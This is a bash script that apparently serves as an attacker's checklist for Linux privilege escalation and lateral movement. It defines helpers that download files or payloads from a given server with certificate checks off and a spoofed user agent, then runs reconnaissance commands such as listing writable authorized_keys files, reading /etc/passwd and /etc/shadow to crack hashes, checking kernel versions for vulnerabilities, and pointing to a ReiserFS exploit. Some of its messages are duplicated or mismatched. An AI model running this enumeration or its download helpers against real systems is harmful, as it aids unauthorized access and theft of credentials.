#!/bin/bash
# 
# Script documents a variety of ways to perform linux privilege escalation/
# lateral movement within Linux environment
# 
# Args:
#     server_host: Hostname/IP of the server to download the file. Required.
#     server_port: Port to use. By default, 8001.
#
if [ $# -lt 1 ]; then
    echo "[-] $0 <server_host> [server_port=8001]"
    exit 1
fi
server_host="$1"
server_port=${2:-"8001"}

# User agent string to use to download the files
# Linux User-agent string
#USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0"
# Mac User-agent string
USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0"

# Download method to use to download the file or file as a string
FILE_DOWNLOAD_METHOD="curl"

# Shell to use to execute commands e.g. /bin/bash, /bin/zsh, /bin/sh, /bin/dash
SHELL="/bin/bash"

# Execute only a subset of command specified
EXEC_SUBSET="0"
#EXEC_SUBSET="1"

function exec_cmd {
    # Function executes a command provided and prints the output displayed
    # 
    # Args:
    #     cmd_to_exec: Execute command. Required.
    # 
    local cmd_to_exec=${1:-""}
    local shell=${2:-"$SHELL"}

    if [ ! -z "$cmd_to_exec" ]; then
        echo "[*] Executing command: $cmd_to_exec"

        # Execute the command using speccified shell
        $shell -c "$cmd_to_exec"

        # create some blank lines for clarity
        echo; echo
    fi
}

function download_file {
    # Function downloads file from the specified URL to a specific file
    # 
    # Args: 
    #     url: URL from which file is downloaded
    # 
    local url="$1"
    local filename=${2:-""}
    local file_download_method=${3:-"$FILE_DOWNLOAD_METHOD"}

    if [ ! -z "$url" ]; then
        if [ -z "$filename" ]; then
            # Prepare the file to download to
            filename=$(dirname "$0")
        fi

        echo "[*] Downloading from url: $url to file: $filename"
        if [ "$file_download_method" == "curl" ]; then
            # Download the file via curl
            curl -A "$USER_AGENT" -s -k "$url" -o "$filename"
        elif [ "$file_download_method" == "wget" ]; then
            # Download the file
            wget --no-check-certificate -U "$USER_AGENT" "$url" -O "$filename"
        fi
        
        echo; echo
    fi
}

function download_string {
    # Function downloads file as a string from the specified URL. Useful if 
    # we wish to pass a binary for file-less download.
    # 
    # Args:
    #     url: URL to download the file from. Required.
    #     string_download_method: Method to use to download the file as a string.
    #         Can be one of: curl
    # 
    # Output:
    #     Contents of downloaded file
    # 
    local url="$1"
    local string_download_method=${2:-"$FILE_DOWNLOAD_METHOD"}

    if [ ! -z "$url" ]; then
        if [ "$string_download_method" == "curl" ]; then
            # Download the file via curl
            curl -A "$USER_AGENT" -s -k "$url"
        fi
    fi
}

if [ "$EXEC_SUBSET" == "1" ]; then
    # Execute a subset of commands specified here - for testing.
    :
    
else
    # Execute all commands for privilege escalation/lateral movement checks

    echo "[!] Check for all users in home dirs if ~/.ssh/authroized_keys file \
is writable by the current user?. If ~/.ssh/authorized_keys file writable? If \
yes, then we can login with that - see https://www.debian.org/devel/passwordlessssh"
    exec_cmd "ls -l /home/*/.ssh/authorized_keys"
    exec_cmd "ls -l /root/.ssh/authorized_keys"

    echo "[!] What mounts are actually available via /etc/fstab - any hidden/ \
unmounted points?"
    exec_cmd "cat /etc/fstab"

    echo "[!] Is private .reiserfs files present? # mount must be available in \
/etc/fstab with user_xattrsReiserFS Exploit for old Linux versions: \
https://www.exploit-db.com/exploits/12130/"
    exec_cmd "cat /etc/fstab"

    echo "[!] Look for any interesting files/folder configurations within /etc \
folder"
    exec_cmd "df"

    echo "[!] Look for any interesting files/folder configurations within /etc \
folder"
    exec_cmd "ls -l /etc"
    
    echo "[!] What /dev (device) mounts actually available via ls command - \
any interesting mounts that we can read/write?"
    echo "[!] Taken from: https://www.denialof.services/lambda/"
    exec_cmd "ls -l /dev"
    
    echo "[!] Determine the current user via 'id' command"
    exec_cmd "id"

    echo "[!] Determine the current user via 'whoami' command"
    exec_cmd "whoami"

    echo "[!] Determine the Linux version via 'uname' - any vulns?"
    exec_cmd "uname -a"

    echo "[!] Determine the Linux version via '/etc/issue' - any vulns?"
    exec_cmd "cat /etc/issue"

    echo "[!] Determine list of all users '/etc/passwd'. Any indications of \
software installed given username with vulns?"
    exec_cmd "cat /etc/passwd"

    echo "[!] Determine the list of all users '/etc/shadow'. Are we already \
root? Can we crack hashes? Any software installed determined from usernames \
with vulns?"
    exec_cmd "cat /etc/shadow"

    
fi